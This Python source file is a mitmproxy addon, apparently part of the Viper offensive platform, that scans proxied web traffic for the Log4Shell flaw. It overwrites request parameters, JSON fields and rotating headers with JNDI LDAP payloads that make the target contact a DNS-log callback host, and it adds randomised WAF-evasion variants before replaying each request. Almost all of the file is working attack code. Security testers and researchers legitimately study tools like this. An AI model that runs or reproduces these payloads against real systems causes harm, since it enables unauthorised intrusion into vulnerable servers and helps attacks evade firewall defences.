# -*- coding: utf-8 -*-
# @File  : log4j_scan.py
# @Date  : 2021/12/16
# @Desc  :
"""Modify HTTP query parameters."""
import ipaddress
import json
import random
import string
import uuid

import redis
import requests
import yaml
from mitmproxy import ctx
from mitmproxy import http


def random_str(num):
    """生成随机字符串"""
    salt = ''.join(random.sample(string.ascii_letters, num))
    return salt


def random_int(num):
    """生成随机字符串"""
    return random.randint(1, num)


# common

def get_redis_url():
    try:
        with open('/root/.msf4/token.yml', 'r', encoding='utf-8') as f:
            token = yaml.load(f.read(), Loader=yaml.Loader).get("token")
            REDIS_URL = f"unix://:{token}@/var/run/redis/redis-server.sock?db="
            return REDIS_URL
    except Exception as E:
        token = "foobared"
        REDIS_URL = f"redis://:{token}@192.168.146.130:6379/"
        return REDIS_URL


VIPER_RPC_UUID_JSON_DATA = "VIPER_RPC_UUID_JSON_DATA"


class RedisClient(object):

    def __init__(self):
        try:
            self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
        except Exception as E:
            self.rcon = None
            ctx.log.error(E)

    def publish_data(self, data):
        if self.rcon is None:
            try:
                self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
            except Exception as E:
                self.rcon = None
                ctx.log.error(E)
        try:
            result = self.rcon.publish(VIPER_RPC_UUID_JSON_DATA, data)
        except Exception as E:
            self.rcon = None

    def rpc_call(self, method_name, timeout=100, **kwargs):
        if self.rcon is None:
            try:
                self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
            except Exception as E:
                self.rcon = None
                ctx.log.error(E)

        message_queue = "rpcviper"
        function_call = {'function': method_name, 'kwargs': kwargs}
        response_queue = f"{message_queue}:rpc:{random_str(32)}"
        rpc_request = {'function_call': function_call, 'response_queue': response_queue}
        rpc_raw_request = json.dumps(rpc_request)

        try:
            self.rcon.rpush(message_queue, rpc_raw_request)
            message_queue, rpc_raw_response = self.rcon.blpop(response_queue, timeout)
            if rpc_raw_response is None:
                self.rcon.lrem(message_queue, 0, rpc_raw_request)
                return
            rpc_response = json.loads(rpc_raw_response.decode())
            return rpc_response
        except Exception as E:
            self.rcon = None
            ctx.log.error(E)


# common

def is_json(data):
    try:
        json.loads(data)
        return True
    except Exception as E:
        return False


class JsonReplace(object):
    def __init__(self):
        pass

    def replace_inter(self, dic, changeData):
        if isinstance(dic, dict):
            return self.replace_dict(dic, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
        elif isinstance(dic, list):
            return self.replace_dict(dic, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
        elif isinstance(dic, str):
            return changeData
        elif isinstance(dic, bytes):
            return changeData.encode()
        else:
            return dic

    # 替换请求参数
    def replace_dict(self, dic, changeData):
        """
        dic：目标字典
        changeData：替换值
        """
        for key in dic:  # 传入数据不符合则对其value值进行遍历
            value = dic[key]
            if isinstance(value, dict):
                dic[key] = self.replace_dict(value, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
            elif isinstance(value, list):
                dic[key] = self.replace_list(value, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
            elif isinstance(value, str):
                dic[key] = changeData
            elif isinstance(value, bytes):
                dic[key] = changeData.encode()

        return dic

    # 替换参数子方法
    # 数据类型判断,遍历后分别调用不用的方法
    def replace_list(self, val, changeData):
        for index in range(len(val)):
            val_ = val[index]
            if isinstance(val_, dict):
                val[index] = self.replace_dict(val_, changeData)  # 传入数据的value值是字典，则调用replace_target_Value
            elif isinstance(val_, list):
                val[index] = self.replace_list(val_, changeData)  # 传入数据的value值是列表或者元组，则调用自身
            elif isinstance(val_, str):
                val[index] = changeData
            elif isinstance(val_, bytes):
                val[index] = changeData.encode()
        return val


class Payload(object):
    def __init__(self):
        pass

    def is_ip_port(self, dnslog_base):
        try:
            ip_port = dnslog_base.split(":")
            port = int(ip_port[1])
            if port < 0 or port > 65535:
                return False
            ip = ipaddress.IPv4Address(ip_port[0])
            return True
        except Exception as E:
            return False

    def bypass_waf_payload(self, raw_payload):
        new_payload = ""
        for one_raw in raw_payload:
            one_format = ""
            for i in range(random_int(3)):
                one_format = f"{one_format}{random_str(random_int(3))}:"
            one_new = f"${{{one_format}-{one_raw}}}"
            new_payload = f"{new_payload}{one_new}"
        return new_payload

    def get_payload_list(self, req_uuid, dnslog_base):
        if self.is_ip_port(dnslog_base):
            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
            bypass_payload = self.bypass_waf_payload(raw_payload)
        else:
            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
            bypass_payload = self.bypass_waf_payload(raw_payload)
        return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]


class Log4jAddon(object):
    def __init__(self):
        self.headers = ['Referer', 'X-Api-Version', 'Accept-Charset', 'Accept-Datetime', 'Accept-Encoding',
                        'Accept-Language', 'Cookie', 'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
                        'Forwarded-Proto', 'From', 'TE', 'True-Client-IP', 'Upgrade', 'User-Agent', 'Via', 'Warning',
                        'X-Api-Version', 'Max-Forwards', 'Origin', 'Pragma', 'DNT', 'Cache-Control', 'X-Att-Deviceid',
                        'X-ATT-DeviceId', 'X-Correlation-ID', 'X-Csrf-Token', 'X-CSRFToken', 'X-Do-Not-Track', 'X-Foo',
                        'X-Foo-Bar', 'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For', 'X-Forwarded-For-Original',
                        'X-Forwarded-Host', 'X-Forwarded-Port', 'X-Forwarded-Proto', 'X-Forwarded-Protocol',
                        'X-Forwarded-Scheme', 'X-Forwarded-Server', 'X-Forwarded-Ssl', 'X-Forwarder-For',
                        'X-Forward-For', 'X-Forward-Proto', 'X-Frame-Options', 'X-From', 'X-Geoip-Country',
                        'X-Http-Destinationurl', 'X-Http-Host-Override', 'X-Http-Method', 'X-Http-Method-Override',
                        'X-HTTP-Method-Override', 'X-Http-Path-Override', 'X-Https', 'X-Htx-Agent', 'X-Hub-Signature',
                        'X-If-Unmodified-Since', 'X-Imbo-Test-Config', 'X-Insight', 'X-Ip', 'X-Ip-Trail',
                        'X-ProxyUser-Ip', 'X-Requested-With', 'X-Request-ID', 'X-UIDH', 'X-Wap-Profile', 'X-XSRF-TOKEN']
        self.headers_index = 0
        self.payload = Payload()
        self.rcon = RedisClient()

    def send_data(self, uuid, data, level="INFO", tag="LOG4J_REQ"):
        senddata = json.dumps({
            "UUID": uuid,
            "TAG": tag,
            "LEVEL": level,
            "DATA": data,
        })
        try:
            result = self.rcon.publish_data(senddata)
        except Exception as E:
            pass

    def payload_list(self, req_uuid):
        dnslog_base = self.rcon.rpc_call("Setting.dnslog_base")
        if dnslog_base is None:
            self.send_data(req_uuid, None, level="WARNING", tag="LOG4J_REQ_NO_DNSLOG")
            return []
        payloads = Payload().get_payload_list(req_uuid, dnslog_base)
        return payloads

    def get_header(self):
        index = self.headers_index % len(self.headers)
        self.headers_index += 1
        return self.headers[index]

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.is_replay == "request":
            return

        if flow.request.method == "GET":
            if flow.request.query:

                req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                payloads = self.payload_list(req_uuid)

                data = {
                    "method": "GET",
                    "url": flow.request.pretty_url,
                }
                self.send_data(req_uuid, data)

                flow = flow.copy()
                for payload in payloads:

                    for key in flow.request.query:
                        flow.request.query[key] = payload

                    flow.request.headers[self.get_header()] = payload

                    # 每个payload发送一次
                    try:
                        result = requests.get(flow.request.pretty_url,
                                              headers=dict(flow.request.headers),
                                              params=dict(flow.request.query))
                    except Exception as E:
                        print(E)

                    # 每个payload发送一次
                    try:
                        ctx.master.commands.call("replay.client", [flow])
                    except Exception as E:
                        print(E)

        elif flow.request.method == "POST":
            if flow.request.urlencoded_form:

                flow = flow.copy()
                req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                payloads = self.payload_list(req_uuid)

                data = {
                    "method": "POST",
                    "url": flow.request.pretty_url,
                    "urlencoded_form": dict(flow.request.urlencoded_form),
                }
                self.send_data(req_uuid, data)

                for payload in payloads:
                    print(flow.request.urlencoded_form)
                    for key in flow.request.urlencoded_form:
                        flow.request.urlencoded_form[key] = payload

                    flow.request.headers[self.get_header()] = payload

                    # 每个payload发送一次
                    try:
                        result = requests.post(flow.request.pretty_url,
                                               headers=dict(flow.request.headers),
                                               data=dict(flow.request.urlencoded_form))
                    except Exception as E:
                        print(E)

                    # 每个payload发送一次
                    try:
                        result = ctx.master.commands.call("replay.client", [flow])
                    except Exception as E:
                        print(E)

            # elif flow.request.multipart_form:
            #
            #     flow = flow.copy()
            #     req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
            #     payloads = self.payload_list(req_uuid)
            #
            #     data = {
            #         "method": "POST",
            #         "url": flow.request.pretty_url,
            #         "multipart_form": dict(flow.request.multipart_form),
            #     }
            #     self.send_data(req_uuid, data)
            #
            #     for payload in payloads:
            #
            #         for key in flow.request.multipart_form:
            #             flow.request.multipart_form[key] = payload
            #
            #         flow.request.headers[self.get_header()] = payload
            #
            #         # 每个payload发送一次
            #         ctx.master.commands.call("replay.client", [flow])

            else:
                if is_json(flow.request.content):

                    flow = flow.copy()
                    req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                    payloads = self.payload_list(req_uuid)

                    data = {
                        "method": "POST",
                        "url": flow.request.pretty_url,
                        "json": flow.request.text,
                    }
                    self.send_data(req_uuid, data)

                    for payload in payloads:
                        old_dict = json.loads(flow.request.text)
                        new_dict = JsonReplace().replace_inter(old_dict, payload)
                        flow.request.text = json.dumps(new_dict)

                        flow.request.headers[self.get_header()] = payload

                        # 每个payload发送一次
                        try:
                            result = requests.post(flow.request.pretty_url,
                                                   headers=dict(flow.request.headers),
                                                   json=new_dict)
                        except Exception as E:
                            print(E)

                        # 每个payload发送一次
                        try:
                            ctx.master.commands.call("replay.client", [flow])
                        except Exception as E:
                            print(E)


## main
addons = [
    Log4jAddon()
]
